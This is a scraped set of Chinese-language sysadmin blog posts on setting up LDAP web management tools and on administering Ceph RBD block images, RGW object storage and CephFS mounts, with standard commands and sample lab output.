LDAP服务的几个重要功能：\n★★★基本的目录查询服务。 目录查询代理服务。 异机复制数据（即主从同步）。 本地基本的目录查询服务 在这种配置模式下，你的slapd只为你的本地域提供目录服务。它不会以任何方式与别的目录服务器交互。这种配置模式如图1所示。\n本地配置模式 带有指针（Referrals）的本地目录服务。 即目录查询代理服务，类似DNS的转发服务器。\n在这种配置模式下，你为你的本地域运行一个LDAP服务器，并且将它配置成为当客户的请求超出你的本地域的处理能力的时候能够返回一个指针，该指针指向一个具备处理客户请求能力的更高级的服务器的地址。你可以自己运行这一服务，也可以使用别人已提供给你的一个。这种配置模式如图2所示。：\n如果你想运行本地目录服务并且参与全属的目录，那么运行这种模式。例如：openldap作为微软活动目录的代理查询服务。\nreferral \u0026lt;URI\u0026gt; 该指令指定了一个指针，当服务器的slapd找不到一个本地的数据库来处理一个请求的时候，它把该指针回传给客户。\n示例：\nreferral ldap://root.openldap.org 这将把非本地的请求“推”到OpenLDAP的根服务器上。“聪明的” LDAP客户会向反馈回来的指针所指的服务器重新发出请求。但是得注意大多数客户仅仅知道怎么样处理简单的LDAP的URL，其中包含主机部分和可选的DN部分。\n同多复制的目录服务。 slarpd守护程序是用来将主slapd上的改变传播到一个或多个从属的slapd上。一个master-slave 类型的配置示例如图3所示。\n这种配置模式可以和前面的两种配置模式之一合起来使用，在前面的两种情况中，单独的slapd不能提供足够的可用性和可靠性。\n简单易用的同步复制目录方案。 利用inotify+ldap客户端命令方案，或者通过定时任务加上ldap客户端命令方案！举MYSQL同步的例子说明！\n分布式的目录服务。 在这种配置模式下，本地的服务被分制成为多个更小的服务，每一个都可能被复制，并且通过上级（superior）或者下级（subordinate）指针（referral）粘合起来。在实际工作中，使用主从同步集群比较多一些，跨机房就是通过openvpn同步。\nldap企业架构逻辑图案例：ldap+haproxy/nginx/hearbeat集群高可用，验证的时候不跨机房。\nLDAP服务的应用领域 LDAP目录服务，适合那些需要从不同的地点读取信息，但是不需要经常更新的业务信息最为有用。\nLDAP的应用主要涉及以下几种类型。I\n信息安全类：数字证书管理、授权管理、单点登录。 科学计算类：DCE（Distributed Computing Environment，分布式计算环境）、UDDI（Universal Description，Discovery and Integration，统一描述、发现和集成协议）。 网络资源管理类：MAIL系统、DNS系统、网络用户管理、电话号码簿。 电子政务资源管理类：内网组织信息服务、电子政务目录体系、人口基础库、法人基础库。 在工作中，常用ldap作为公司入职后的所有员工账号等的基础信息库，例如：邮件账号，电脑登陆账号、办公平台账号、共享服务账号、SVN账号、VPN账号、服务器的账号，无线网登陆账号等的公共账号登陆信息库。可以理解为企业的活动目录一样，另外，LDAP也可以和微软活动目录打通。\n画一个内网AD域，和机房的LDAP服务打通的架构图！\nLDAP服务的常见开源产品 Openldap是LDAP最好的开源实现，在其Openldap许可证下发行，并且已经被包含在众多流行的linux发行版中\n官方网站为 openldap.org\n官方man手册 http://www.openldap.org/software/man.cgi\nopenldap UI ldap的客户端管理接口有很多，有b/s结构的web的，也有c/s结构的，我们以b/s结构的 ldap-account-manager-3.7.tar.gz 软件为例进行讲解\nB/S 架构的 LDAP Account Manager C/S 架构的 LDAP Admin LDAP Account Manager LAM是php服务需要安装lamp环境\nyum install -y\\ nginx \\ php \\ php-ldap \\ php-gd \\ php-fpm rpm -qa \\ nginx \\ php \\ php-ldap \\ php-gd \\ php-fpm 下载解压配置ldap客户端软件 下载地址：https://www.ldap-account-manager.org/lamcms/releases\ncp config.cfg_sample config.cfg cp lam.conf_sample lam.conf sed -i 's@cn=Manager@cn=admin@g' lam.conf sed -i 's@dc=my-domain@dc=cylon@g' lam.conf sed -i 's@dc=com@dc=org@g' lam.conf diff lam.conf_sample lam.conf 提示： 此处改的地方很多\n配置nginx chown nginx.nginx /var/www/html/ldap -R worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { root /var/www/html; index index.html index.htm; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } location ~ \\.php$ { fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } } } LAM使用 步骤1：打开浏览器或者在前面的访问基础上刷新：http:/10.0.0.20/ldap，正常会出现界面如下图所示：\n步骤2：点击右上角的“LAMconfiguration”链接进行配置。\n步骤3：点击上图中的 “Edit general settings” 链接进行配置\n由于系统的密码为字母 “lam”，太简单了，我们先把密码改掉，其他的配置，我们根据需求以后可以再改，注意：这里是系统设置的权限密码，非页面上登录的密码。\n步骤5：上文点OK后就会到重新登录的界面进行登录，如下图：\n提示：\n请牢记，这是 ==ldap管理员用户admin及密码==，非前面设置的系统内部配置密码，ldap 管理员用户admin及密码是在配置openldap中生成的\n步骤6：初始化ldap数据库的域。\n步骤7：命令查看下刚才的操作帮我们建立了什么？。\n$ ldapsearch -LLL -w 123 -x -H ldap://10.0.0.20 -D \u0026quot;cn=admin,dc=cylon,dc=org\u0026quot; -b \u0026quot;dc=cylon,dc=org\u0026quot; \u0026quot;(uid=chau)\u0026quot; dn: uid=chau,ou=People,dc=cylon,dc=org objectClass: posixAccount objectClass: inetOrgPerson objectClass: organizationalPerson objectClass: person homeDirectory: /home/chau loginShell: /bin/bash cn: cylon chau uidNumber: 10006 gidNumber: 10000 userPassword:: e1NTSEF9c0YzZzBSbnFBU1NoWEVBWEFSS1lPdG41WjZRR1pxNCs= sn: chau givenName: cylon uid: chau 步骤8：继续添加ldap账号和组。\ndn: cn=tech,ou=group,dc=cylon,dc=org objectClass: posixGroup description:: 5oqA5pyv6Y0o gidNumber: 10001 cn: tech 添加用户\n$ ldapsearch -LLL -w 123 -x -H ldap://10.0.0.20 -D \u0026quot;cn=admin,dc=cylon,dc=org\u0026quot; -b \u0026quot;dc=cylon,dc=org\u0026quot; \u0026quot;(uid=cylon)\u0026quot; dn: uid=cylon,ou=People,dc=cylon,dc=org objectClass: posixAccount objectClass: inetOrgPerson objectClass: organizationalPerson objectClass: person homeDirectory: /home/chau loginShell: /bin/bash cn: cylon chau uidNumber: 10006 userPassword:: e1NTSEF9c0YzZzBSbnFBU1NoWEVBWEFSS1lPdG41WjZRR1pxNCs= sn: chau givenName: cylon uid: cylon gidNumber: 10001 通过web接口管理ldap的配置完成！也已经初始化了用户组及用户\nphpldapadmin yum install -y \\ php \\ php-fpm \\ php-ldap \\ php-gd \\ php-mbstring \\ php-pear \\ php-bcmath \\ php-xml \\ phpldapadmin \\ nginx worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; root /usr/share/phpldapadmin/htdocs; location / { index index.html index.htm index.php; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } location ~ \\.php$ { fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } } } ","permalink":"https://www.oomkill.com/2019/08/ch1-understanding-ldap/","summary":"","title":"理解ldap - 什么是ldap"},{"content":"上一章提到了 RBD 块设备相关的基本配置，这章主要描述 RBD 操作部分\nceph块设备接口（RDB） Ceph块设备，也称为RADOS块设备（简称RBD），是一种基于RADOS存储系统支持超配（thin-provisioned）、可伸缩的条带化数据存储系统，它通过librbd库与OSD进行交互。RBD为KVM等虑拟化技术和云OS（如OpenStack和CloudStack）提供高性能和无限可扩展性的存储后端，这些系统依赖于libvirt和QEMU实用程序与RBD进行集成。\n客户端基于librbd库即可将RADOS存储集群用作块设备，不过，用于rbd的存储池需要实现启用rbd功能并进行初始化。例如，下面的命令创建rbddata的存储池，在启动rbd功能后对其进行初始化。\nceph osd pool create rbdpool 64 # 创建存储池\rrbd pool init -p rbdpool # rbd create rbdpool/img1 --size 2G rbd ls -p rbdpool\r不过rbd存储池并不能直接用于块设备，而是需要事先在其中按需创建影响（image）\nRBD是建立在librados之上的客户端，全程为Rados Block Devices，是对rados存储服务做抽象，将rados位于存储池当中所提供的存储空间，使用对象式存储数据的能力的机制。\nrbd虚拟磁盘设备要想使linux内核所识别使用，要求linux在内核级支持Ceph，内核级有一个Ceph模块，专门用来驱动Ceph设备的。这个驱动就叫librbd。此模块自己是一个客户端，能够连接至RBD服务上，检索出他所管理的镜像文件。从而镜像文件完全可以被linux主机作为一块完整的硬盘来使用。\n创建存储池镜像\n--object-size 任何数据存储在存储池中都被切分为固定大小的对象，对象通常称之为条带，切分的对象大小，默认4M --image-feature 指定镜像文件的特性，每种特性代表镜像文件能支持哪些种功能，可被单独启用或禁用。 layering(+), 分层克隆 exclusive-lock 排它锁，是否支持分布式排它锁，已用来限制一个镜像文件同时只能被一个客户端使用。 object-map(+*) 对象映射,是否支持对象位图，主要用于加速导入、导出及已用容量统的。 fast-diff(+*), 快速比较，主要用于做快照之间的比较 deep-flatten(+-) , 深层展评 journaling 日志，用户在修改image数据时是否记录日志。 shared image --no-progress：不显示创建过程 $ rbd help create\rusage: rbd create [--pool \u0026lt;pool\u0026gt;] [--image \u0026lt;image\u0026gt;] [--image-format \u0026lt;image-format\u0026gt;] [--new-format] [--order \u0026lt;order\u0026gt;] [--object-size \u0026lt;object-size\u0026gt;] [--image-feature \u0026lt;image-feature\u0026gt;] [--image-shared] [--stripe-unit \u0026lt;stripe-unit\u0026gt;] [--stripe-count \u0026lt;stripe-count\u0026gt;] [--data-pool \u0026lt;data-pool\u0026gt;] [--journal-splay-width \u0026lt;journal-splay-width\u0026gt;] [--journal-object-size \u0026lt;journal-object-size\u0026gt;] [--journal-pool \u0026lt;journal-pool\u0026gt;] [--thick-provision] --size \u0026lt;size\u0026gt; [--no-progress] \u0026lt;image-spec\u0026gt; Create an empty image.\rceph osd pool create kube 64 64\rceph osd pool application enable kube rbd\rrbd pool init kube\rrbd create --size 2G --pool kube --image vol01 # 使用各个选项\rrbd create --size 2G kube/vol02 # \u0026lt;image-spec\u0026gt; 获取对象更详细信息\nPARENT 父镜像\nFMT 格式，一般只有v2\nPROT\nLOCK\n$ rbd ls -l --pool kube\rNAME SIZE PARENT FMT PROT LOCK vol01 5 GiB 2 $ rbd ls -l --pool kube --format json --pretty-format\r[\r{\r\u0026quot;image\u0026quot;: \u0026quot;vol01\u0026quot;,\r\u0026quot;size\u0026quot;: 5368709120,\r\u0026quot;format\u0026quot;: 2\r}\r]\r获取镜像文件更详细一部镜像信息，可以使用rbd info命令\n$ rbd info kube/vol01\rrbd image 'vol01':\rsize 5 GiB in 1280 objects\rorder 22 (4 MiB objects)\rid: 5e386b8b4567\rblock_name_prefix: rbd_data.5e386b8b4567\rformat: 2\rfeatures: layering, exclusive-lock, object-map, fast-diff, deep-flatten\rop_features: flags: create_timestamp: Mon Jun 24 05:42:00 2019\r$ rbd info --pool kube --image vol01\rrbd image 'vol01':\rsize 5 GiB in 1280 objects\rorder 22 (4 MiB objects)\rid: 5e386b8b4567\rblock_name_prefix: rbd_data.5e386b8b4567\rformat: 2\rfeatures: layering, exclusive-lock, object-map, fast-diff, deep-flatten\rop_features: flags: create_timestamp: Mon Jun 24 05:42:00 2019\r$ rbd info --pool kube vol01 rbd image 'vol01': # 镜像文件是谁\rsize 5 GiB in 1280 objects # 镜像总体是多大空间，被分割成多少个对象\rorder 22 (4 MiB objects) # 顺序是22，顺序是指块大小的标识序号 # 如64k开始64m结束，4M大小正好排在第22位\rid: 5e386b8b4567 # 镜像文件自身id\rblock_name_prefix: rbd_data.5e386b8b4567\rformat: 2 # 镜像文件格式\rfeatures: layering, exclusive-lock, object-map, fast-diff, deep-flatten # 启动的特性\rop_features: flags: create_timestamp: Mon Jun 24 05:42:00 2019\r# object-map, fast-diff, deep-flatten种特性在被linux客户端作为磁盘加载到内核中使用时是不被支持的。需将其禁用掉 禁用或启用某种特性 rbd featrue\nrbd feature disable|enable\rrbd feature disable kube/vol01 object-map fast-diff deep-flatten\r$ rbd info --pool kube vol01\rrbd image 'vol01':\rsize 5 GiB in 1280 objects\rorder 22 (4 MiB objects)\rid: 5e386b8b4567\rblock_name_prefix: rbd_data.5e386b8b4567\rformat: 2\rfeatures: layering, exclusive-lock\rop_features: flags: create_timestamp: Mon Jun 24 05:42:00 2019\rCeph客户端使用块设备步骤\n创建出镜像文件。 在镜像文件上禁用默认启用的五个特性中的后三个。 在客户端上使用指定命令以指定的用户的身份连入客户端。 配置客户端上yum仓库文件 ceph命令默认是以admin为账号的，使用--user指定其他用户。\n$ ceph -s\r2019-06-25 10:48:11.283 7f999daa3700 -1 auth: unable to find a keyring on /etc/ceph/ceph.client.admin.keyring,/etc/ceph/ceph.keyring,/etc/ceph/keyring,/etc/ceph/keyring.bin,: (2) No such file or directory\r2019-06-25 10:48:11.283 7f999daa3700 -1 monclient: ERROR: missing keyring, cannot use cephx for authentication\r[errno 2] error connecting to the cluster\r$ ceph --user kube -s\rcluster:\rid: 69fb9b55-3fb5-42d0-8cf7-239a3b569791\rhealth: HEALTH_WARN\r1 pool(s) full\rapplication not enabled on 1 pool(s)\rservices:\rmon: 3 daemons, quorum stor01,stor02,stor03\rmgr: stor01(active), standbys: stor04\rmds: cephfs-1/1/1 up {0=stor02=up:active}\rosd: 8 osds: 8 up, 8 in\rrgw: 1 daemon active\rdata:\rpools: 9 pools, 352 pgs\robjects: 254 objects, 3.7 KiB\rusage: 49 GiB used, 51 GiB / 100 GiB avail\rpgs: 352 active+clean\r需要操作系统支持ceph.ko模块\n$ modinfo ceph\rfilename: /lib/modules/3.10.0-957.12.1.el7.x86_64/kernel/fs/ceph/ceph.ko.xz\rlicense: GPL\rdescription: Ceph filesystem for Linux\rauthor: Patience Warnick \u0026lt;patience@newdream.net\u0026gt;\rauthor: Yehuda Sadeh \u0026lt;yehuda@hq.newdream.net\u0026gt;\rauthor: Sage Weil \u0026lt;sage@newdream.net\u0026gt;\ralias: fs-ceph\rretpoline: Y\rrhelversion: 7.6\rsrcversion: 43DA49DF11334B2A5652931\rdepends: libceph\rintree: Y\rvermagic: 3.10.0-957.12.1.el7.x86_64 SMP mod_unload modversions signer: CentOS Linux kernel signing key\rsig_key: 2C:7C:17:70:5C:86:D4:20:80:50:D3:F5:54:56:9A:7B:D3:BF:D1:BF\rsig_hashalgo: sha256\r显示设备map信息\n$ rbd showmapped\rid pool image snap device 0 kube vol01 - /dev/rbd0 显示设备挂在到哪里\n$ rbd showmapped\rid pool image snap device 0 kube vol01 - /dev/rbd0 NAME SIZE PARENT FMT PROT LOCK vol01 5 GiB 2 excl 卸载挂载\n$ umount /dev/rbd0 # 需要先卸载rbd挂载\r$ rbd unmap /dev/rbd0 $ rbd showmapped\r调整镜像文件空间容量\n$ rbd help resize usage: rbd resize [--pool \u0026lt;pool\u0026gt;] [--image \u0026lt;image\u0026gt;] --size \u0026lt;size\u0026gt; [--allow-shrink] [--no-progress] \u0026lt;image-spec\u0026gt; Resize (expand or shrink) image.\rPositional arguments\r\u0026lt;image-spec\u0026gt; image specification\r(example: [\u0026lt;pool-name\u0026gt;/]\u0026lt;image-name\u0026gt;)\rOptional arguments\r-p [ --pool ] arg pool name\r--image arg image name\r-s [ --size ] arg image size (in M/G/T) [default: M] --allow-shrink permit shrinking # 允许收缩，不要收缩到已有数据占用容量、以下\r--no-progress disable progress output\r$ rbd resize -s 10G kube/vol01\rResizing image: 100% complete...done.\r$ rbd ls -p kube -l\rNAME SIZE PARENT FMT PROT LOCK vol01 10 GiB 删除镜像文件\n镜像文件被删除是不可恢复的\n$ rbd rm kube/vol01\rRemoving image: 100% complete...done.\r$ rbd ls -p kube -l\r$ rbd回收站trash\n将镜像挪入回收站中\n$ rbd ls -p kube -l\rNAME SIZE PARENT FMT PROT LOCK vol01 2 GiB 2 vol02 2 GiB 2 $ rbd trash move kube/vol01\r$ rbd ls -p kube -l NAME SIZE PARENT FMT PROT LOCK vol02 2 GiB 2 $ rbd trash list -p kube\r5ebf6b8b4567 vol01\r从trash恢复镜像\n$ rbd trash list -p kube\r5ebf6b8b4567 vol01\r$ rbd trash restore -p kube --image vol01 --image-id 5ebf6b8b4567\r$ rbd ls -p kube vol01\rvol02\r如何对镜像文件做快照、克隆\n快照是什么？\n快照是一种能够瞬间生成数据访问目录，能够支持备份技术的一种数据管理手段。有全量快照与增量快照两种。全量快照一般使用镜像分离技术实现，而增量快照则由COW写时拷贝快照技术ROW写时重定向。 写时复制是指，当写的时候，将数据复制到快照上去修改源数据；写时重定向是指，写的时候直接去写快照，改变快照上的数据，源卷上的数据不变。\nsnap相关命令\n命令 说明 snap create (snap add) 创建快照 snap limit clear 清除快照数量限制 snap limit set 设定一个镜像文件上所能够创建的快照问价你的上线 snap list (snap ls) 列出快照 snap protect 保护快照 snap purge 清理快照 snap remove (snap rm) 移除快照 snap rename 重命名快照 snap rollback (snap revert) 回滚快照，做快照恢复 snap unprotect 解除保护，protect的相反操作。 为镜像创建快照\nrbd snap create只需为哪个镜像创建什么快照就可以了\nrbd snap create kube/vol01@snap1\r$ rbd snap list kube/vol01\rSNAPID NAME SIZE TIMESTAMP 4 snap1 2 GiB Thu Jun 27 14:00:36 2019 快照恢复\n首先先将服务停止（拆除）\numount /rdb # 卸载挂载\rrbd unmap /dev/rbd0 # 拆除连接\r回到管理节点做回滚操作\n使用rbd snap rollback\n$ rbd snap rollback kube/vol01@snap1\rRolling back to snapshot: 100% complete...done.\r回到客户端再一次将映射挂载访问\nrbd --user kube map /dev/rbd0 # 映射\rmount /dev/rbd0 /rdb # 挂载\r# 查看数据\r$ ls\rlost+found passwd\r删除快照\nrbd snap rm kube.vol01@snap1\r限制镜像文件所能够创建的快照数量\nrbd snap limit set kube/vol01 --limit 2\r$ rbd snap create kube/vol01@snap03\rrbd: failed to create snapshot: (122) Disk quota exceeded\rrbd snap limit clear kube/vol01 # 清除限制\r多层快照技术\n对原始镜像文件做一次快照，将此快照置于保护模式下。快照所能访问的数据一定是做快照那一刻原始卷上的所有数据的。就算修改原始卷内容，也不会影响快照访问。基于快照再做一层快照。而二级快照是可以当镜像来用的。因此基于保护快照可以创建N个克隆。每一个克隆都可以按照自己的意愿去做希望所做的后续修改操作。\n模板池，提供克隆模板的。\n工作流程\n创建镜像 对镜像做快照 对快照做保护 对快照做克隆 在管理断创建快照，将此快照当做保护模式下的快照，当做创建克隆时的模板\n$ rbd snap create kube/vol01@clonetpl1\r$ rbd snap ls\rrbd: image name was not specified\r$ rbd snap ls kube/vol01\rSNAPID NAME SIZE TIMESTAMP 4 snap1 2 GiB Thu Jun 27 14:00:36 2019 5 snap02 2 GiB Thu Jun 27 14:41:25 2019 8 clonetpl1 10 GiB Thu Jun 27 20:43:48 2019 置入保护模式\n$ rbd snap protect kube/vol01@clonetpl1\rrbd snap unprotect kube/vol01:clonetpl1 # 解除保护\r给快照再次做快照，称之为clone。==可支持跨存储池进行克隆==\n$ rbd clone kube/vol01@clonetpl1 test/myimg01 # 是一个镜像，可被当做真正镜像使用\r$ rbd ls -p test\rmyimg01\rrbd chlidren显示一个快照的子项\n$ rbd children kube/vol01@clonetpl1 kube/myimg01\rtest/myimg01\r数据展平 flatten\n当vol01被删除时，他的上层快照myimg01就无根了，因此需要做数据展平，已确保他所应用的每一个底层快照上的所有数据都被复制到当前镜像中。\n$ rbd flatten kube/myimg01\rImage flatten: 100% complete...done.\r","permalink":"https://www.oomkill.com/2019/07/03-2-rbd-management/","summary":"","title":"Ceph RBD - 关于RBD的操作与管理"},{"content":"什么是对象存储 对象存储是一种以非结构化格式（称为对象），简单来说，对象存储是一种将文件存储为对象而不是数据块的存储架构。它是一种将非结构化数据存储在跨位置分布的结构化平面文件系统中的方法。在这种格式中，文件空间由元数据标签组成，支持简单的 API 来描述、读取、删除和定位对象。因此，您可以通过 API 协议直接访问任何设备上保存的数据。此类元数据标签包括有助于更好地识别和分类数据的唯一标识符。\n这些元数据标签是高度可定制的，让您可以在需要时通过跟踪和索引文件来轻松组织、访问和检索所有数据。对象存储服务可以在设备级、系统级甚至接口级实现。作为对象存储的数据可确保数据可用性、可搜索性并增强数据安全性，因为它可以保护数据免遭意外删除或损坏。\n什么是 CEPH 中的对象存储 在知道了对象存储不能作为文件系统磁盘由操作系统直接访问，只可以通过应用程序级别的 API 进行访问。Ceph是一个分布式对象存储系统，通过一个 “网关服务” 来提供对象存储接口，这个服务被称为 RADOS Gateway ( RGW )，RGW是构建在 Ceph RADOS 之上，通过在 librados 之构建出的一个库 librgw，实际上是一个 Civetweb 的服务，rados gateway 内嵌在里面，RGW 为应用程序提供兼容 RESTful 的 S3/Swift 的 API 接口，以在 Ceph 集群中以对象的形式存储数据。Ceph 还支持多租户对象存储，可通过 RESTful API 访问。除此之外，RGW 还支持 Ceph 管理 API，可用于使用本机 API 调用来管理 Ceph 存储集群。\nlibrados 是一个构建在 RADOS 集群和 Ceph 集群的中间层，通过这个库，提供了允许用户应用程序通过C、C++、Java、Python 和 PHP绑定直接访问 Ceph 存储集群。Ceph 对象存储还具有多站点 (MultiSite) 能力，即提供灾难恢复的解决方案。\n图：Ceph RGW Structure\rSource：https://docs.ceph.com/en/octopus/radosgw/\n安装rgw\nrgw 包 ceph-radosgw\nceph中的对象存储是使用HTTP服务与Ceph群集进行交互的（radosgw）由radosgw 提供与OpenStack Swift和Amazon S3兼容的接口，因此radosgw具有自己的管理用户。\n![](../../../images/ceph object store/1ae399f8fa9af1042d3e1cbf31828f14eb3fe01a6eb3352f88c3d2a04ac4dc50.png)\nceph-deploy rgw create cn01\n修改默认端口\n创建用户\n$ radosgw-admin user create --uid demo --display-name \u0026quot;seal\u0026quot;\r{\r\u0026quot;user_id\u0026quot;: \u0026quot;demo\u0026quot;,\r\u0026quot;display_name\u0026quot;: \u0026quot;seal\u0026quot;,\r\u0026quot;email\u0026quot;: \u0026quot;\u0026quot;,\r\u0026quot;suspended\u0026quot;: 0,\r\u0026quot;max_buckets\u0026quot;: 1000,\r\u0026quot;subusers\u0026quot;: [],\r\u0026quot;keys\u0026quot;: [\r{\r\u0026quot;user\u0026quot;: \u0026quot;demo\u0026quot;,\r\u0026quot;access_key\u0026quot;: \u0026quot;9REMQZ4789I85QJFW93I\u0026quot;,\r\u0026quot;secret_key\u0026quot;: \u0026quot;akYcu5ncvgMxCljTNGrGTHUBbMzjJmETfxtBW7SX\u0026quot;\r}\r],\rradosgw-admin user list\nERROR: S3 error: 416 (InvalidRange)\n解决办法：\n将其他对象存储后台驻留程序（OSD）添加到群集或将“mon_max_pg_per_osd”的默认值增加到300以上。\n修改配置文件（管理节点操作）：\n$ vim ceph.conf\n[mon] mon allow pool delete = true mon_max_pg_per_osd = 300\n$ ceph-deploy \u0026ndash;overwrite-conf config push c720181 c720182 c720183\n重启mon服务（集群mon节点都要操作）：\nsystemctl restart ceph-mon.target\n416\nset default pg_num and pgp_num to lower value(8 for example), or set mon_max_pg_per_osd to a high value in ceph.conf\n416\n403 (SignatureDoesNotMatch) 修改配置文件 signature_v2 = True\ns3cmd ls s3cmd ls s3://demob\r# 创建bucket\rs3cmd mb s3://demob\r# 上传目录\rs3cmd put /etc/ s3://demob/etc --recursive\r","permalink":"https://www.oomkill.com/2019/07/05-1-rgw/","summary":"","title":"Ceph对象存储概述"},{"content":"Ceph专门提供了文件系统接口CephFS。CephFS是略微不同于RBD的架构形式，在基础的RADOS Cluster存储集群的基础之上，需要额外运行一个守护进程MDS MetaDataServer 元数据服务器。\nRADOS Cluster自己是一个对象存储服务，他无法管理传统文件系统上分离去管理元数据和数据的功能。（而且元数据还拥有权限、用户属组、时间戳等。）RADOS Cluster自身是无法实现这个功能的。MDS专用于模拟传统文件系统所应该具有的将数据和元数据分离存储的方式而专门提供的一个服务。MDS只用来管理元数据。\nMDS需要工作一个守护进程，客户端必须通过套接字的方式，每一次访问文件时，先去联系到MDS，来获取文件的元数据信息，再到RADOS Cluster以对象方式，将对象模拟成传统文件系统的块，来加载文件数据。\n如是挂在CephFS系统的客户端，需先联系到MDS，识别文件系统的各种信息。客户端向挂载目录路径下的任何一个读写操作就相当于由挂载时的内核驱动模块联系到对应的MDS，而后再由客户端之上的模块来联系到RADOS Cluster。为了能够支持CephFS文件系统，也需要内核级模块Ceph.ko模块。挂载过程机制为将内核模块作为文件系统内核的客户端，与文件系统的守护进程进行通讯，必要时将用户数据存取转为对应集群的存储操作。\n对于Rados存储集群来讲，存储集群所有数据都会被放在存储池当中，而CephFS管理其数据和元数据分别放置在不同的存储池中。所有元数据都是由MDS管理的。MDS也是客户端，连入CephFS的的metadata，专门用于存储元数据的存储池。\ncephfs逻辑\n元数据是一类很密集的IO访问。对原数据存储池的操作是放置在存储池当中的，但在本地会使用内存（高速缓存）中完成，过断时间同步到metadata pool中。而数据直接写入data存储池中\nmeatdata pool只能对mds访问，其他任何客户端时不能被访问的。客户端对元数据的访问必须经由MDS来实现。\n当客户端打开一个文本时，首先请求客户端的inode（传统文件系统采用inode来保存文件的元数据）。获得相应授权以后从mds中接收到inode，inode中标示文件的数据究竟放置在data pool的那些对象中。返回对象编号给客户端，客户端基于对象编号访问所有的对象，将数据加载到。\nceph mds stat\nmds: 2 up:standby 当没有文件系统时，无法进行选举，故所有的都为standby\nCephFS Client访问CephFS集群的方式\n客户端挂载CephFS， 基于内核文件系统完成挂载ceph、libcephfs 用户空间文件系统（FUSE Filesystem in USErspace）：libcephfs与ceph集群进行交互。 ==激活CephFS步骤==\n激活CephFS MDS，至少有一个节点运行ceph-mds守护进程\nceph-deploy命令完成的 创建存储池：metadata-pool、data-pool\nceph osd pool create cephfs_metadata 8 8\rceph osd pool create cephfs_data 8 8\r激活文件系统：\nceph fs new \u0026lt;name\u0026gt; {metadata-pool-name} {pool-name} ceph fs status {filesystem-name} ceph fs stat 获得必要授权，才能使用服务\nceph auth get-or-create client.fsclient mon 'allow r' mds 'allow rw' osd 'allow rwx pool=cephfs-data' -o ceph.client.fsclient.keyring 客户端挂载\n客户端挂载时key和用户名要分开两个不通选项来指定的。 $ ceph-authtool -p -n client.fsclient ceph.client.fsclient.keyring AQATNhZdmHEBIBAA52a2MESQJS8mMScxPzRkIA==\r$ ceph auth print-key client.fsclient\rAQATNhZdmHEBIBAA52a2MESQJS8mMScxPzRkIA==\rceph auth print-key client.fsclient \u0026gt;fsclient.key # 此key文件是被客户端使用的。需要复制到客户端\rscp fsclient.key root@172.18.0.6:/etc/ceph\r确保安装ceph-common客户端 确保内核中有ceph模块ceph.ko，此模块必须存在才能使用Ceph客户端 确定可获取到Ceph集群的配置文件ceph.conf。 $ mount -t ceph stor01:6789,stor02:6789,stor03:6789:/ /data -o name=fsclient,secretfile=/etc/ceph/fsclient.key\r# stat 跟挂载点可查看文件系统类型\r$ stat -f /data\r文件：\u0026quot;/data\u0026quot;\rID：cfb80ce541d5e304 文件名长度：255 类型：ceph\r块大小：4194304 基本块大小：4194304\r块：总计：1061 空闲：1061 可用：1061\rInodes: 总计：0 空闲：-1\r如需开机自启动需写入/etc/fstab下\nstor01:6789,stor02:6789,stor03:6789:/ /data ceph name=fsclient,secretfile=/etc/ceph/fsclient.key,_netdev,noatime 0 0\rumount /data\rmount -a # 自动挂载 如内核级没有提供ceph模块，就无法基于内核文件系统形式挂载和使用ceph客户端， 此时就只能使用ceph-fuse客户端。\nfuse不要求内核级必须有相应的内核模块，但要求在用户空间安装一个程序包ceph-fuseceph以用户空间形式的文件系统逻辑来挂载ceph。无需ceph-common并且一样需提供用于认证的客户端账号。\n$ ceph-fuse -n client.fsclient -m stor01:6789,stor02:6789,stor03:6789 /data\r2019-06-29 16:09:14.537 7f42c9515c00 -1 init, newargv = 0x55baceded440 newargc=7\rceph-fuse[50438]: starting ceph client\rceph-fuse[50438]: starting fuse\r注：内核只要支持应该使用内核级，用户空间级的性能上比不上内核级文件系统。\n开机自动挂载\nnone /data fuse.ceph ceph.id=fsclient,ceph.conf=/etc/ceph/ceph.conf,_netdev,default 0 0\rCephFS工作模型 文件元数据的工作负载通常是一类小而密集的IO请求，因此很难实现类似数据读写IO那样的扩展方式。\n分布式文件系统业界提供了将名称空间分割治理的解决方案，通过将文件系统根树及其热点子树分别存储于不同的元数据服务器进行负载均衡，从而赋予了元数据存储线性扩展的可能\n静态子树分区，固定的不灵活 静态hash分区，对文件名或目录进行hash运算 惰性混编分区，将静态hash和传统文件方式混合使用 动态子树分区， Multi MDS 多主MDS模式是指CephFS将整个文件系统的名称空间切分为多个子树并配置到多个MDS之上，不过，读写操作的负载均衡策略分别是子树切分和目录副本\n将写操作负载较重的目录切分成多个子目录以分散负载 为读操作负载较重的目录创建多个副本以均衡负载 子树分区和迁移的决策是一个同步过程，各MDS每10秒钟做一次独立的迁移决策，每个MDS并不存在一个一致的名称空间视图，且MDS集群也不存在一个全局调度器负责统一的调度决策\n各MDS彼此间通过交换心跳信息（HeartBeat，简称HB）及负载状态来确定是否要进行迁移、如何分区名称空间，以及是否需要目录切分为子树等\n管理员也可以配置CephFS负载的计算方式从而影响MDS的负载决策，目前，CephFS支持基于CPU负载、文件系统负载及混合此两种的决策机制 动态子树分区依赖于共享存储完成热点负载在MDS间的迁移，于是Ceph把MDS的元数据存储于后面的RADOS集群上的专用存储池中，此存储池可由多个MDS共享\n·MIDS对元数据的访问并不直接基于RADOS进行，而是为其提供了一个基于内存的缓存区以缓存热点元数据，并且在元数据相关日志条目过期之前将一直存储于内存中\nCephFS使用元数据日志来解决容错问题 ·元数据日志信息流式存储于CephFS元数据存储池中的元数据日志文件上，类似于LFS（Log-Structured File System）和WAFL（Write Anywhere File Layout）的工作机制， 